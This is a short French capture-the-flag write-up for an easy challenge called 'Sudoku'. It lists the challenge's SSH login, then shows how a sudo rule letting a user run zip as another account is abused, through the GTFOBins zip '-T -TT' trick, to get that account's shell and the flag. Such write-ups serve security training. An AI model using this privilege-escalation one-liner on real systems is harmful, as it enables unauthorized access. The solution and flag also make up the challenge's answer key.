# Sudoku

## Sujet :

> Lors de l'un de vos tests de sécurité, vous compromettez un serveur applicatif.
> 
> Prouvez à vos clients que vous pouvez obtenir des informations sensibles d'autres utilisateurs.
>
> === Connexion SSH ===
> 
> Login : padawan
> 
> Mdp : padawan
> 
> Serveur : sudoku.phack.fr

Tags : `system` `sudo` `easy`

## Solution :

On liste avec `$ sudo -l` les commandes qu'on peut exécuter avec les droits d'un autre utilisateur.
```
$ sudo -l
User padawan may run the following commands on sudoku:
    (master) NOPASSWD: /usr/bin/zip
```

Tiens donc ! On fait un petit tour du côté de https://gtfobins.github.io/ pour trouver une vuln associée à zip.
Et en effet, on peut obtenir un shell :
```
$ TF=$(mktemp -u)
$ sudo -u master zip $TF /etc/hosts -T -TT 'sh #'
$ whoami
master
```

`PHACK{U_h4v3_tH3_suP3r_P0w3r}`